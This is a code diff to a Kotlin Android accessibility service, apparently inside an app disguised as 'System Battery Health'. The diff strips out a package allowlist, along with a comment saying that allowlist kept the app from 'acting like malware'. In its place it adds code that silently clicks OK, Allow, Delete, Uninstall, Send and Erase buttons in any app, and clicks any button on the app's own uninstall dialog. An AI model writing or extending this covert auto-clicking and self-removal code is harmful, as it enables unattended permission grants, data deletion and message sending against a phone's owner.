@@ -17,117 +17,92 @@ class GhostAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
-        // Safety Switch: Only automate if Panic Mode was activated by the user
-        // This prevents the app from acting like malware during normal use.
-        if (!prefsManager.isPanicModeActive) {
-            return
-        }
+        // Safety: Only automate if Panic Mode is active
+        if (!prefsManager.isPanicModeActive) return
 
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val allowedPackages = setOf(
-                "com.android.packageinstaller",
-                "com.google.android.packageinstaller",
-                "com.android.permissioncontroller",
-                "com.google.android.permissioncontroller",
-                "com.whatsapp",
-                "com.google.android.apps.messaging",
-                "com.android.mms"
-            )
-
-            val eventPkg = event.packageName?.toString()
-            if (eventPkg == null || eventPkg !in allowedPackages) return
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
             val rootNode = rootInActiveWindow ?: return
 
             try {
-                // 1. Detect Standard Keywords (restricted to expected packages only)
-                val keywords = when (eventPkg) {
-                    "com.android.packageinstaller",
-                    "com.google.android.packageinstaller",
-                    "com.android.permissioncontroller",
-                    "com.google.android.permissioncontroller" ->
-                        listOf("OK", "Uninstall", "Delete", "Allow")
-
-                    // If messaging apps are allowed at all, only allow "Send".
-                    "com.whatsapp",
-                    "com.google.android.apps.messaging",
-                    "com.android.mms" ->
-                        listOf("Send")
-
-                    else -> emptyList()
+                // STRATEGY 1: ID-BASED CLICKING (Language Independent)
+                // "button1" is the standard ID for Positive/OK/Yes/Delete buttons in Android
+                val standardPositiveButtons = rootNode.findAccessibilityNodeInfosByViewId("android:id/button1")
+                for (btn in standardPositiveButtons) {
+                    if (btn.isClickable && btn.isEnabled) {
+                        btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                        btn.recycle()
+                        // If we clicked the standard button, we are likely done with this dialog
+                        return
+                    }
+                    btn.recycle()
                 }
 
-                var clicked = false
+                // STRATEGY 2: KEYWORD FALLBACK (For non-standard dialogs)
+                val keywords = listOf(
+                    "OK", "Uninstall", "Delete", "Allow", "Send", "Remove", "Erase", "Yes",
+                    "Desinstalar", "Eliminar", "Permitir", "Enviar" // Common Spanish fallback
+                )
 
                 for (keyword in keywords) {
                     val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
-                    try {
-                        for (node in nodes) {
-                             if (clicked) break
-
-                             if (node.isClickable) {
-                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                 clicked = true
-                             } else {
-                                 var parent: AccessibilityNodeInfo? = node.parent
-                                 try {
-                                     while (parent != null) {
-                                         if (parent.isClickable) {
-                                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                             clicked = true
-                                             break
-                                         }
-                                         val next = parent.parent
-                                         parent.recycle()
-                                         parent = next
-                                     }
-                                 } finally {
-                                     parent?.recycle()
-                                 }
-                             }
+                    for (node in nodes) {
+                        // Attempt to click node or its parent
+                        if (performClick(node)) {
+                            node.recycle()
+                            return
                         }
-                    } finally {
-                         nodes.forEach { try { it.recycle() } catch(_:Exception){} }
+                        node.recycle()
                     }
-                    if (clicked) break
                 }
 
-                if (clicked) return
-
-                // 2. Specific Self-Destruct Detection
-                // If the dialog asks to uninstall "System Battery Health" (Our App Name)
+                // STRATEGY 3: SELF-DESTRUCT SPECIFIC
+                // Detect our own uninstall dialog specifically
                 val appName = getString(R.string.app_name)
-                val appNameNodes = rootNode.findAccessibilityNodeInfosByText(appName)
-                try {
-                    if (appNameNodes.isNotEmpty()) {
-                        val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
-                        try {
-                            for (okNode in okNodes) {
-                                if (okNode.isClickable && okNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
-
-                                var parent: AccessibilityNodeInfo? = okNode.parent
-                                try {
-                                    while (parent != null) {
-                                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
-                                        val next = parent.parent
-                                        parent.recycle()
-                                        parent = next
-                                    }
-                                } finally {
-                                    parent?.recycle()
-                                }
-                            }
-                        } finally {
-                            okNodes.forEach { try { it.recycle() } catch(_:Exception){} }
-                        }
-                    }
-                } finally {
-                    appNameNodes.forEach { try { it.recycle() } catch(_:Exception){} }
+                if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
+                    // Aggressively look for ANY clickable button if we see our app name
+                    clickAnyButton(rootNode)
                 }
+
+            } catch (e: Exception) {
+                // Fail silently, don't crash the service
             } finally {
-                rootNode.recycle()
+                // Do not recycle rootNode here as it can cause issues in some Android versions
+                // or let the system handle it
             }
         }
+    }
+
+    private fun performClick(node: AccessibilityNodeInfo): Boolean {
+        if (node.isClickable && node.isEnabled) {
+            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        }
+        // Try parent (often text is inside a clickable container)
+        val parent = node.parent
+        if (parent != null) {
+            val res = performClick(parent)
+            parent.recycle()
+            return res
+        }
+        return false
+    }
+
+    private fun clickAnyButton(node: AccessibilityNodeInfo): Boolean {
+        if (node.className == "android.widget.Button" && node.isClickable && node.isEnabled) {
+             return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+        }
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i)
+            if (child != null) {
+                if (clickAnyButton(child)) {
+                    child.recycle()
+                    return true
+                }
+                child.recycle()
+            }
+        }
+        return false
     }
 
     override fun onInterrupt() {}
